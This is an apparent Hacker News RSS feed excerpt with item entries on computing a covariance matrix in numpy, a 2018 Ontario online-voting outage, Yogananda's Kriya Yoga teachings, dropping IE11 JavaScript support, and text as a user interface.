</code></pre></div></div><pre>array([[ 2.66666667,  0.66666667, -2.66666667],
       [ 0.66666667,  4.66666667,  2.33333333],
       [-2.66666667,  2.33333333,  4.66666667]])
</pre><p>Looks good!</p><h3 id="finding-the-covariance-matrix-with-the-dot-product">Finding the covariance matrix with the dot product</h3><p>There is another way to compute the covariance matrix of $\bs{A}$. You can center $ \bs{A}$ around 0 (subtract the mean of the vector to each element of the vector to have a vector of mean equal to 0, <em>cf</em>. below), multiply it with its own transpose and divide by the number of observations. Let’s start with an implementation and then we’ll try to understand the link with the previous equation:</p><div><div><pre><code><span>def</span> <span>calculateCovariance</span><span>(</span><span>X</span><span>):</span>
    <span>meanX</span> <span>=</span> <span>np</span><span>.</span><span>mean</span><span>(</span><span>X</span><span>,</span> <span>axis</span> <span>=</span> <span>0</span><span>)</span>
    <span>lenX</span> <span>=</span> <span>X</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>
    <span>X</span> <span>=</span> <span>X</span> <span>-</span> <span>meanX</span>
    <span>covariance</span> <span>=</span> <span>X</span><span>.</span><span>T</span><span>.</span><span>dot</span><span>(</span><span>X</span><span>)</span><span>/</span><span>lenX</span>
    <span>return</span> <span>covariance</span>
</code></pre></div></div><p>Let’s test it on our matrix $\boldsymbol{A}$:</p><pre>array([[ 2.66666667,  0.66666667, -2.66666667],
       [ 0.66666667,  4.66666667,  2.33333333],
       [-2.66666667,  2.33333333,  4.66666667]])
</pre><p>We end up with the same result as before!</p><p>The explanation is simple. The dot product between two vectors can be expressed:</p><p>$ \bs{X^\text{T}Y}= \sum_{i=1}^{n}(x_i)(y_i) $</p><p>That’s right, it is the sum of the products of each element of the vectors:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/dot-product.png" width="400" alt="The dot product corresponds to the sum of the products of each elements of the vectors" title="The dot product."> <em>The dot product corresponds to the sum of the products of each element of the vectors.</em></p><p>If $n$ is the number of elements in our vectors and that we divide by $n$:</p><p>$ \frac{1}{n}\bs{X^\text{T}Y}= \frac{1}{n}\sum_{i=1}^{n}(x_i)(y_i) $</p><p>You can note that this is not too far from the formula of the covariance we have seen above:</p><p>$ cov(\bs{X},\bs{Y}) = \frac{1}{n} \sum_{i=1}^{n}(x_i-\bar{x})(y_i-\bar{y}) $</p><p>The only difference is that in the covariance formula we subtract the mean of a vector to each of its elements. This is why we need to center the data before doing the dot product.</p><p>Now if we have a matrix $\bs{A}$, the dot product between $\bs{A}$ and its transpose will give you a new matrix:</p><p><img src="https://hadrienj.github.io/assets/images/Preprocessing-for-deep-learning/covariance-dot-product.png" width="400" alt="Covariance matrix and dot product" title="Covariance matrix and dot product."> <em>If you start with a zero-centered matrix, the dot product between this matrix and its transpose will give you the variance of each vector and covariance between them, that is to say the covariance matrix.</em></p><p>This is the covariance matrix! 🌵</p><h2 id="b-visualize-data-and-covariance-matrices">B. Visualize data and covariance matrices</h2><p>In order to get more insights about the covariance matrix and how it can be useful, we will create a function used to visualize it along with 2D data. You will be able to see the link between the covariance matrix and the data.</p><p>This function will calculate the covariance matrix as we have seen above. It will create two subplots: one for the covariance matrix and one for the data. The <code>heatmap</code> function from Seaborn is used to create gradients of color: small values will be colored in light green and large values in dark blue. The data is represented as a scatterplot. We choose one of our palette colors, but you may prefer other colors 🌈.</p><div><div><pre><code><span>def</span> <span>plotDataAndCov</span><span>(</span><span>data</span><span>):</span>
    <span>ACov</span> <span>=</span> <span>np</span><span>.</span><span>cov</span><span>(</span><span>data</span><span>,</span> <span>rowvar</span><span>=</span><span>False</span><span>,</span> <span>bias</span><span>=</span><span>True</span><span>)</span>
    <span>print</span> <span>'Covariance matrix:</span><span>\n</span><span>'</span><span>,</span> <span>ACov</span>

    <span>fig</span><span>,</span> <span>ax</span> <span>=</span> <span>plt</span><span>.</span><span>subplots</span><span>(</span><span>nrows</span><span>=</span><span>1</span><span>,</span> <span>ncols</span><span>=</span><span>2</span><span>)</span>
    <span>fig</span><span>.</span><span>set_size_inches</span><span>(</span><span>10</span><span>,</span> <span>10</span><span>)</span>

    <span>ax0</span> <span>=</span> <span>plt</span><span>.</span><span>subplot</span><span>(</span><span>2</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>

    <span># Choosing the colors
</span>    <span>cmap</span> <span>=</span> <span>sns</span><span>.</span><span>color_palette</span><span>(</span><span>"GnBu"</span><span>,</span> <span>10</span><span>)</span>
    <span>sns</span><span>.</span><span>heatmap</span><span>(</span><span>ACov</span><span>,</span> <span>cmap</span><span>=</span><span>cmap</span><span>,</span> <span>vmin</span><span>=</span><span>0</span><span>)</span>

    <span>ax1</span> <span>=</span> <span>plt</span><span>.</span><span>subplot</span><span>(</span><span>2</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>)</span>

    <span># data can include the colors
</span>    <span>if</span> <span>data</span><span>.</span><span>shape</span><span>[</span><span>1</span><span>]</span><span>==</span><span>3</span><span>:</span>
        <span>c</span><span>=</span><span>data</span><span>[:,</span><span>2</span><span>]</span>
    <span>else</span><span>:</span>
        <span>c</span><span>=</span><span>"#0A98BE"</span>
    <span>ax1</span><span>.</span><span>scatter</span><span>(</span><span>data</span><span>[:,</span><span>0</span><span>],</span> <span>data</span><span>[:,</span><span>1</span><span>],</span> <span>c</span><span>=</span><span>c</span><span>,</span> <span>s</span><span>=</span><span>40</span><span>)</span>

    <span># Remove the top and right axes from the data plot
</span>    <span>ax1</span><span>.</span><span>spines</span><span>[</span><span>'right'</span><span>].</span><span>set_visible</span><span>(</span><span>False</span><span>)</span>
    <span>ax1</span><span>.</span><span>spines</span><span>[</span><span>'top'</span><span>].</span><span>set_visible</span><span>(</span><span>False</span><span>)</span>
</code></pre></div></div><h2 id="c-simulating-data">C. Simulating data</h2><p>Now that we have the plot function, we will generate some random data to visualize what the covariance matrice can tell us. We will start with some data drawn from …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/">https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/</a></em></p>]]>
            </description>
            <link>https://hadrienj.github.io/posts/Preprocessing-for-deep-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25078004</guid>
            <pubDate>Fri, 13 Nov 2020 02:05:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jason Scott: Your Pal, the Internet Archive, and how to use it. [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077936">thread link</a>) | @toomuchtodo
<br/>
November 12, 2020 | https://www.twitch.tv/videos/797446891?t=0h20m45s | <a href="https://web.archive.org/web/*/https://www.twitch.tv/videos/797446891?t=0h20m45s">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.twitch.tv/videos/797446891?t=0h20m45s</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077936</guid>
            <pubDate>Fri, 13 Nov 2020 01:53:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Failure in Small Town Ontario (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077860">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086 | <a href="https://web.archive.org/web/*/https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Bradford West Gwillimbury voters have until Oct. 23 at 8 p.m. to cast their ballots</p><div id="details-body" data-words="437" itemprop="articleBody">
        <p dir="ltr">The company responsible for the online voting system in Bradford West Gwillimbury has blamed the Election Night crash on a slow down caused by a Toronto-based facility.</p>

<p dir="ltr">About 51 municipalities around Ontario started experiencing slow traffic with Dominion Voting Systems around 6 p.m., according to a press release issued by the company late Monday night.</p>

<p dir="ltr">“This load issue was documented, reviewed and determined to be the result of a Toronto-based Internet Colocation provider placing an unauthorized limit on incoming voting traffic that was roughly 1/10th of the system’s designated bandwidth,” read the release.</p>

<p dir="ltr">A co-location provider is a data center facility in which a business can rent space for servers and other computer hardware.</p>

<p dir="ltr">Dominion was unaware of the problem until municipality representatives started contacting it for help and to share complaints from voters, read the release.</p>

<p dir="ltr">“Once we became aware of the problem, Dominion was able to quickly identify the source of the issue and work with the provider to resolve all issues with the system service by 7:30 p.m.,” read the release.</p>

<p dir="ltr">“Unfortunately, the 90-minute slowdown and resulting bandwidth issue caused a varying number of voters to experience slow response times and system time-outs.”</p>

<p dir="ltr">Many communities affected by the crash have extended the voting period. In BWG, residents have until 8 p.m. today to cast their ballots.</p>

<p dir="ltr">The town will also be hosting an Election Night gathering at the Bradford and District Memorial Community Centre at 7:30 p.m.</p>

<p dir="ltr">“Dominion regrets the challenges that our system load issue posed for both election officials and voters alike in today’s elections,” read the Dominion release.</p>

<p dir="ltr">“We want to assure Ontario voters that we will work to ensure this problem does not occur in future elections. It is important to note that at no time was the integrity of the system at risk of compromise, or in any way insecure.”</p>

<p dir="ltr">As of Monday morning, 5,603 votes had been submitted in the BWG municipal election, making up a little more than 23 per cent of the eligible voters, according to Caleigh Clubine, the town’s community relations officer.</p>

<p dir="ltr">At an election gathering Monday evening, several BWG candidates said their confidence in online voting is now lacking.</p>

<p dir="ltr">“If you voted early, it worked really good, (but) you have to have the proper services. You’ll get a large volume (and if you are not prepared for that) you haven’t done your job,” said Ward 4 incumbent Ron Orr.</p>

<p dir="ltr">“Does it shake our confidence in the system? Sure it does,” added Deputy Mayor James Leduc. “I’m frustrated the system wasn’t stress-tested enough. We won’t be strictly online voting again. We’ll have both systems again.”</p>

    </div></div>]]>
            </description>
            <link>https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077860</guid>
            <pubDate>Fri, 13 Nov 2020 01:42:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kriya Yoga]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077810">thread link</a>) | @whereistimbo
<br/>
November 12, 2020 | http://yogananda.com.au/kriya.html | <a href="https://web.archive.org/web/*/http://yogananda.com.au/kriya.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
        
<h2 id="science">The Science of Kriya Yoga</h2>
      <p><em>Excerpts from  Autobiography of a Yogi by Paramahansa Yogananda</em></p>
      <p><em>Kriya Yoga</em> is a simple, psychophysiological method by which human blood is decarbonated and recharged with oxygen. The atoms of this extra oxygen are transmuted into life current to rejuvenate the brain and spinal centers. By stopping the accumulation of venous blood, the yogi is able to lessen or prevent the decay of tissues. The advanced yogi transmutes his cells into energy. Elijah, Jesus, Kabir, and other prophets were past masters in the use of <em>Kriya</em> or a similar technique, by which they caused their bodies to materialize and dematerialize at will. </p>
<p><em>Kriya</em> is an ancient science. Lahiri Mahasaya received it from his great guru, Babaji, who rediscovered and clarified the technique after it had been lost in the Dark Ages. Babaji renamed it, simply, <em>Kriya Yoga</em>.</p>


<p>"The <em>Kriya Yoga</em> that I am giving to the world through you in this nineteenth century," Babaji told Lahiri Mahasaya, "is a revival of the same science that Krishna gave millenniums ago to Arjuna; and that was later known to Patanjali and Christ, and to St. John, St. Paul, and other disciples.”</p>
<figure>
  <figcaption><b>TRANSMISSION OF KRIYA YOGA</b></figcaption><img src="http://yogananda.com.au/img/gurus_img/kriya_transmission530.jpg" alt="Kriya Yoga "></figure>

      <h2>Kriya Yoga in  the Bhagavad Gita</h2>
      <p> <em>Kriya Yoga</em> is twice referred to by Lord Krishna, India’s greatest prophet, in the Bhagavad-Gita. One stanza reads: </p>
      <p>"Offering the inhaling breath into the exhaling breath and offering the exhaling breath into the inhaling breath, the yogi neutralizes both breaths; thus he releases prana from the heart and brings life force under his control." <em><br>
        —The Bhagavad Gita IV:29</em></p>
      <p>The interpretation is: “The yogi arrests decay in the body by securing an additional supply of prana (life force) through quieting the action of the lungs and heart; he also arrests mutations of growth in the body by control of apana (eliminating current). Thus neutralizing decay and growth, the yogi learns life-force control." </p>
      <p>Another Gita stanza states: </p>
      <p>"That meditation-expert (<em>muni</em>) becomes eternally free who, seeking the Supreme Goal, is able to withdraw from external phenomena by fixing his gaze within the mid-spot of the eyebrows and by neutralizing the even currents of <em>prana</em> and <em>apana</em> [that flow] within the nostrils and lungs; and to control his sensory mind and intellect; and to banish desire, fear, and anger.” <br>
        —<em>The Bhagavad Gita V:27-28</em></p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2>Kriya Yoga in Yoga Sutras by Patanjali</h2>
      <p><em>Kriya Yoga</em> is mentioned twice by the ancient sage Patanjali, foremost exponent of yoga, who wrote: </p>
      <p>"<em>Kriya Yoga</em> consists of <br>
        body discipline, <br>
        mental control, 
      and 
        <br>
        meditating on <em>Aum</em>." <br>
      —Yoga Sutras II:1</p>
      <p><img src="http://yogananda.com.au/img/gl/aum133.jpg" alt="yogananda.com.au" width="145" height="133">Patanjali speaks of God as the actual Cosmic Sound of <em>Aum</em> that is heard in meditation. <em>Aum</em> is the Creative Word, the whir of the Vibratory Motor, the witness of Divine Presence. Even the beginner in yoga may soon hear the wondrous sound of <em>Aum</em>. Through this blissful spiritual encouragement, he becomes convinced that he is in communion with supernal realms. </p>
      <p>Patanjali refers a second time to the <em>Kriya</em> technique or life-force control thus: </p>
      <p>"Liberation can be attained by that pranayama <br>
        which is accomplished by disjoining the course of inspiration and expiration.” <br>
      —Yoga Sutras II:49</p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2>Accelerated Spiritual Evolution with  Kriya Yoga </h2>
      <p><img src="http://yogananda.com.au/img/pics/chakras300.gif" alt="chakras" width="300" height="428"></p>
      <p>"<em>Kriya Yoga</em> is an instrument through which human evolution can be quickened," Sri Yukteswar explained to his students. "The ancient yogis discovered that the secret of cosmic consciousness is intimately linked with breath mastery. This is India's unique and deathless contribution to the world's treasury of knowledge. The life force, which is ordinarily absorbed in maintaining heart action, must be freed for higher activities by a method of calming and stilling the ceaseless demands of the breath." </p>
      <p>The <em>Kriya</em> Yogi mentally directs his life energy to revolve, upward and downward, around the six spinal centers (medullary, cervical, dorsal, lumbar, sacral, and coccygeal plexuses), which correspond to the twelve astral signs of the zodiac, the symbolic Cosmic Man. One-half minute of revolution of energy around the sensitive spinal cord of man effects subtle progress in his evolution; that half-minute of <em>Kriya</em> equals one year of natural spiritual unfoldment.</p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <p>One thousand <em>Kriyas</em> practiced in eight and a half  hours gives the yogi, in one day, the equivalent of one thousand years of natural evolution: 365,000 years of evolution in one year. In three years, a <em>Kriya Yogi</em> can thus accomplish by intelligent self-effort the same result that Nature brings to pass in a million years. The <em>Kriya</em> shortcut, of course, can be taken only by deeply developed yogis. With the guidance of a guru, such yogis have carefully prepared their body and brain to withstand the power generated by intensive practice. </p>
		<p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <p>The body of the average man is like a fifty-watt lamp, which cannot accommodate the billion watts of power roused by an excessive practice of <em>Kriya</em>. Through gradual and regular increase of the simple and foolproof methods of <em>Kriya</em>, man's body becomes astrally transformed day by day, and is finally fitted to express the infinite potentials of cosmic energy, which constitutes the first materially active expression of Spirit.</p>
      <p>Referring to the sure and methodical efficacy of yoga, Krishna praises the technological yogi in the following words: </p>
      <p>"The yogi is greater than body-disciplining ascetics, greater even than the followers of the path of wisdom (Jnana Yoga), or of the path of action (Karma Yoga); be thou, O disciple Arjuna, a yogi!" <br>
      —The Bhagavad Gita VI:46</p>
    <figure><img src="http://yogananda.com.au/img/pics/yogameditation550.jpg" alt="??">
    <figcaption>Yoga Meditation</figcaption></figure>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2 id="divine">From Material to Divine Consciousness</h2>
      <p>The <em>Kriya Yoga</em> meditation techniques of <em>pranayama</em>, life-force control that transmutes breath into subtle lifetronic energy, bring positive realization that the composition of the body is pure cosmic energy. </p>
      <p>In the adept practice of <em>Kriya</em>, the body is oxygenated and its atoms etherealized until it becomes light as a feather. Man has no idea how much power comes into the body when he has mastered the mystery of the breath. <em>Kriya</em> practice brings a regulated, continuous inflow of oxygen into the body, the atoms of which, by the process of <em>pranayama</em>, are transmuted into life force, reinforcing the subtle currents in the spine, which in turn awaken the astral cerebrospinal centers and spiritualize the entire body. </p>
      <p>After years of successful practice, the body of the advanced <em>Kriya Yogi</em> becomes so spiritualized that in exalted states he can hardly feel it touch the ground. The suffusion of life force becomes so powerful that the whole body loses its delusive solidity and actually levitates. I can testify to that from my own experience. But the beginner should not expect to jump weightless tomorrow! Modern man is accustomed to getting results quickly; his industry and technology manufactures products so rapidly that he thinks there should be a convenience package of concise spiritual progress as well. A presumption of instant spiritual achievement is perhaps more than a bit audacious considering the innumerable lifetimes already spent in making oneself an unspiritual being. Even a lifelong practice is little to be required. Nevertheless, the <em>Kriya Yoga</em> science and art of meditation are not drudgery, because gradual transforming results are felt from the very beginning. (p.823, <cite>The Second Coming of Christ</cite> by Paramahansa Yogananda)</p>
      <p><a href="http://yogananda.com.au/gurus/yoganandaquotes03.html">The best  Paramahansa Yogananda quotes on Kriya Yoga</a></p>
      <p><a href="http://yogananda.com.au/gita/gita0429k1.html">Next Page »</a> </p>
<p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="om" width="19" height="20"></p>
</article>
      <!-- end article1 -->
    </div></div>]]>
            </description>
            <link>http://yogananda.com.au/kriya.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077810</guid>
            <pubDate>Fri, 13 Nov 2020 01:36:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dropping Support for IE11 Is Progressive Enhancement]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077805">thread link</a>) | @afrcnc
<br/>
November 12, 2020 | https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/ | <a href="https://web.archive.org/web/*/https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><em>TL;DR if you have to choose, you should prioritize users with no JavaScript over users with old JavaScript.</em></p><p>If you’re a web developer working today, it’s probably long passed time for you to <strong>stop transpiling your modern JavaScript into ES5 for Internet Explorer</strong>. Any time or effort spent getting your JavaScript working in IE11 is wasted time that could be better spent <strong>making a better experience for users without JavaScript</strong>. Moving your resources from Internet Explorer to users without JavaScript will let you improve the SEO and accessibility of your site while providing a better experience for everyone.</p><p>First, some notes about <em>who this advice is for</em>: I am assuming you’re working for a small team with no Quality Assurance testing department making a content focused site. If you have a large team that actually QA tests IE11, this advice may not apply to your situation. If you’re just doing personal projects for fun, you should have already dropped ES5 years ago. If you’re making more of an app than a content site, you probably should have cut off IE11 years ago, but the calculations are more complex and site specific.</p><hr><h2 id="why-drop-support-for-ie11-javascript">Why drop support for IE11 JavaScript?</h2><p>To begin with, Internet Explorer represents <strong>less than 1%</strong> of my work traffic according to Google Analytics. People will sometime spin this away by arguing that 1% of a large number is also a large number. If you have 100 million hits, 1% is 1 million hits! But the flipside is that 99 million hits are <em>not</em> Internet Explorer and are not helped by optimizations aimed at Internet Explorer. What’s more this number has been <strong>falling steadily</strong>. Even just in the year and a half that my work site has been around it has dropped. It used to be closer to 2%. On top of that, outside of corporate/enterprise settings, most of these computers browsing your site with Internet Explorer will <strong>also have Chrome installed</strong>, and approximately 100% of the users will <strong>also own a smart phone</strong> they can use to browse your site if their computer cannot display it correctly. The computers in question will be old and have <strong>terrible performance</strong> assuming you do get the JavaScript to run in the first place.</p><p>Let’s contrast this with other users we could optimize for. The number of <strong>visually impaired</strong> readers is steady and will not go down absent some breakthrough in medical technology. Visually impaired readers can’t just use another device if the site doesn’t work in the device they have in front of them. In fact, even users who have physically normal vision are impaired when driving or walking, and it seems to me inevitable that as <strong>voice assistants</strong> become ubiquitous and easy to use, sighted users having websites read aloud to them will eventually become commonplace. Plus, there are <a href="https://arstechnica.com/tech-policy/2019/10/accessibility-the-future-and-why-dominos-matters/">legal imperatives</a> to make reasonable accommodations for visually impaired readers.</p><p>Users <strong>without JavaScript</strong> are another important consideration. As Jake Archibald said, <a href="https://www.twitter.com/jaffathecake/status/207096228339658752">“All your users are non-JS while they’re downloading your JS.”</a> And remember that sometimes, your user’s connection will drop out, and <a href="https://kryogenix.org/code/browser/everyonehasjs.html">the JavaScript will never load</a>. But beyond that, browsers like Opera Mini and extensions like NoScript or overly aggressive ad blockers are already about as common as users of Internet Explorer, and they’re not going to go away. It’s hard to estimate the number of people with JavaScript broken or disabled, but <a href="https://deliberatedigital.com/blockmetry/javascript-disabled">it appears to be stable from year to year</a>, because the underlying causes aren’t subject to change, unlike IE11 usage. Year over year, old computers will be replaced, and IE11 will fade. Disliking ads and having bad connections on the other hand are here to stay. Then there are the most important users of your site without JavaScript: <strong>web spiders and search engines</strong>. While Google does in theory use headless browsers to scrape sites while executing JavaScript, in practice, you’ll still get better SEO if you optimize your content to work without it, and there are other non-Google spiders that you may want crawling your site too, like the <a href="https://cloudinary.com/blog/a_primer_on_microbrowsers_tips_and_tricks_for_managing_the_seo_feedback_loop">microbrowsers</a> which add link previews to chat and social media.</p><p>If you’re running a small site without a QA team, it’s probably worth going to <a href="https://www.browserling.com/">Browserling</a> right now and finding out if you’re even working in Internet Explorer to begin with. Browserling will let you run a virtual PC with Internet Explorer from your own browser for a limited time for free, so it’s probably easiest way to do a quick low effort <a href="https://en.wikipedia.org/wiki/Smoke_testing_(software)">smoke test</a> of your Internet Explorer support without having to install anything. Just open up a tab, take a look at your site, and see if the results surprise you.</p><p>I’ve seen developers (including most especially myself) burned by just <em>assuming</em> that <a href="https://babeljs.io/">Babel</a> and <a href="https://github.com/postcss/autoprefixer">Autoprefixer</a> have solved all their problems with IE11. You may already be dropping support for IE11, you just don’t know it yet. I’ve had sites I work on break for months at a time in Internet Explorer with no complaints from readers. One site I redesigned got just a single reader inquiry about a widget that broke in IE11 after a redesign. When I told the reader to try loading the page in Chrome, he seemed satisfied. More recently, IE11 has had some terrible rendering bugs on my site for days or months at a time that have triggered <em>zero</em> reader complaints. If I don’t QA it myself, no one else will do it for me.</p><p>If you think your code will work but haven’t actually QA tested it, it can lead to the worst of both worlds: code bloated with extras for IE11 that still doesn’t even work anyway. It’s not enough to transpile down to ES5, you also need to polyfill every missing DOM API you use, and that can be a very complicated and bloated proposition.</p><p>Essentially, there are three target web platforms you might want to support:</p><ol><li>Modern browsers</li><li>Browsers without JavaScript</li><li>Internet Explorer 11 (if you’re supporting &lt;11, 😱)</li></ol><p>If you try to support IE11 but aren’t actually QA testing it, you will probably end up with only modern browsers working. It is better to aim for both modern browser support and no-JS browser support and actually succeed than to try for IE11 support and silently fail.</p><hr><h2 id="what-should-you-do-instead-of-optimizing-ie11">What should you do instead of optimizing IE11?</h2><p>The web is built on the foundation of <strong>progressive enhancement</strong>. Deliver “good enough” service to legacy browsers, and save the enhancements for the bulk of your userbase.</p><p>In 2017, Philip Walton advocated the “<a href="https://philipwalton.com/articles/deploying-es2015-code-in-production-today/">module/nomodule</a>” pattern for JavaScript. This can be reduced to the “module/bare minimum” pattern today. Walton wrote:</p><blockquote><p>Most developers think of <code>&lt;script type="module"&gt;</code> as way to load ES modules (and of course this is true), but <code>&lt;script type="module"&gt;</code> also has a more immediate and practical use-case—loading regular JavaScript files with ES2015+ features and knowing the browser can handle it!</p><p>To put that another way, every browser that supports <code>&lt;script type="module"&gt;</code> also supports most of the ES2015+ features you know and love.</p></blockquote><p>Essentially, if you set the script element’s type attribute to an unknown value, browsers will just ignore the script. The effect of this is that IE11 will ignore the contents of any <code>&lt;script type="module"&gt;</code> tags. Modern browsers, on the other hand, will ignore the contents of <code>&lt;script nomodule&gt;</code> tags. This allows roughly targeting your JavaScript to its intended platform.</p><p>Walton goes on to advocate creating <strong>two versions of the same JavaScript bundle</strong> with Webpack. Send modern browsers a smaller, modules specific ES2015 version and older browsers a larger, transpiled and polyfilled ES5 version.</p><p>As I wrote above, I think just using Babel to turn your JavaScript into ES5 cannot be trusted to actually work without constant QA vigilance. A seemingly insignificant change in your code might silently break IE11 support, and you could be none the wiser for months or years unless you constantly recheck IE11. Instead of this futile strategy of pushing back the tide, I advocate sending IE11 users <strong>as little JavaScript as possible</strong>, ideally none, but practically speaking, <strong>probably just your ads and analytics</strong>, and then <strong>actually test</strong> that it works.</p><p>The first step is to decide what your organizational priorities are. These days most software engineers are familiar with the concept of the <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable product</a>. What’s the <em>minimum viable experience</em> that you’re willing to deliver to IE users? Maybe you’re not ready to write them off completely and just deliver a broken page and a “Best Viewed in Chrome” icon. But you may be willing to say that as long as they view your ads, you don’t care if they can bypass the paywall or can’t comment on articles. In my case, I want Internet Explorer using readers to be able to read my articles and to show up in my analytics. Everything else, I’m willing to cut or sacrifice in the name of freeing up the resources for creating a better no-JS experience. If that’s my minimum viable experience, I am going to create it and test that it actually works, and then <strong>stop iterating</strong>, so that I don’t accidentally break it with my future changes to the enhanced, modern browser experience.</p><p>It may seem like more work to craft a separate experience for ES5 users instead of just backporting your modern JS, but it’s really not. The whole point of modern frontend JavaScript is that everything is broken into small modules that are imported and bundled in development. So, <a href="https://github.com/spotlightpa/poor-richard/blob/ab0ad83/src/esbuild/nomodules.js">here is the whole of the entrypoint</a> for my ES5/IE11 build:</p><div><pre><code data-lang="javascript"><span>import</span> <span>"../utils/add-listeners.js"</span><span>;</span>

<span>// eslint-disable-next-line no-console
</span><span></span><span>console</span><span>.</span><span>warn</span><span>(</span><span>"could not load enhancements"</span><span>);</span>
<span>document</span><span>.</span><span>body</span><span>.</span><span>classList</span><span>.</span><span>add</span><span>(</span><span>"has-old-js"</span><span>);</span>
</code></pre></div><p>Once the import is loaded, Babel’d, and minifed, it comes to 17KB (real KB, not <a href="https://twitter.com/carlmjohnson/status/1069968685606031360">moon weight</a><i>!</i>). Essentially all the listeners do are add <a href="https://github.com/jehna/ga-lite">some analytics</a> and the JavaScript to make the menu hamburger button work. The <code>.has-old-js</code> class triggers a CSS utility class to show and hide things conditionally. A <code>&lt;noscript&gt;</code> tag in the HTML does the same, as does an <code>onerror</code> handler on the module script. This lets me show one experience to modern browsers and a secondary fallback experience to everyone else. Because this code is essentially set in stone, I …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/">https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/</a></em></p>]]>
            </description>
            <link>https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077805</guid>
            <pubDate>Fri, 13 Nov 2020 01:35:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Game with 179 levels generated using neural networks]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25077797">thread link</a>) | @ent101
<br/>
November 12, 2020 | https://www.outpan.com/app/99694412f2/qubes | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/99694412f2/qubes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/99694412f2-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>23</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/99694412f2/qubes">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/99694412f2/qubes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077797</guid>
            <pubDate>Fri, 13 Nov 2020 01:34:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Text as a User Interface]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077768">thread link</a>) | @thesephist
<br/>
November 12, 2020 | https://thesephist.com/posts/text/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/text/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>There’s a resurgence in products using text as the primary user interface.</p>
<p>The most popular tool that uses text as a core UI is probably Microsoft Excel. Excel is a mostly-<a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> application, but when interacting with formulas and programming cells, the interface of choice for most users is text – typing in formulas as textual information, not clicking buttons. When we want to take the sum over a row, most of us click on the cell and type <code>=SUM(A3:A10)</code> – we don’t click on a “sum” button or unfurl a dropdown menu.</p>
